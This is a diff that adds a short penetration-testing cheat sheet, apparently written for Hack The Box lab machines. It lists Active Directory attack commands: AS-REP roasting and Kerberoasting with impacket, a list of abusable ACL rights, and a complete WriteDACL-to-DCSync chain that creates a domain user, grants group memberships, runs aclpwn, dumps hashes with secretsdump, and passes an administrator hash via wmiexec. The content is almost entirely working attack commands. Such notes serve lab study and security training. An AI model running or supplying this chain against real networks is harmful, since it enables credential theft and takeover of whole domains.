@@ -1,0 +1,37 @@
+#ASREPRoast: check for users having UF_DONT_REQUIRE_PREAUTH set (Doesn't require auth)
+python /opt/impacket/examples/GetNPUsers.py htb.local/
+python /opt/impacket/examples/GetNPUsers.py htb.local/ -usersfile usernames.txt
+
+#Kerberoasting: check users SPN (Require Auth)
+python opt/impacket/examples/GetUserSPNs.py active.local/svc_user -dc-ip 10.10.10.100
+
+#GetADUsers
+GetADUsers.py -all -dc-ip 10.10.10.161 htb.local/svc-alfresco
+
+###Some rights meaning 
+#ref: https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
+GenericAll - full rights to the object (add users to a group or reset user's password)
+GenericWrite - update object's attributes (i.e logon script)
+WriteOwner - change object owner to attacker controlled user take over the object
+WriteDACL - modify object's ACEs and give attacker full control right over the object
+AllExtendedRights - ability to add user to a group or reset password
+ForceChangePassword - ability to change user's password
+Self (Self-Membership) - ability to add yourself to a group
+
+#WriteDACL privilege on Domain => DCSync privilege escalation
+net user john abcd1234 /add /domain
+(Check password policy for minimun passwd lengh)
+
+net group "Exchange Windows Permissions" john /add
+
+net localgroup "Remote Management Users" john /add (to allow to connect remotely)
+
+aclpwn -f john -ft user -d htb.local -p abcd1234 -s 10.10.10.161
+
+impacket-secretsdump 'john:abcd1234@10.10.10.161'
+or
+python secretsdump.py htb.local/john:abcd1234@10.10.10.161 -just-dc
+
+and PassTheHash
+wmiexec.py -hashes :32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
+
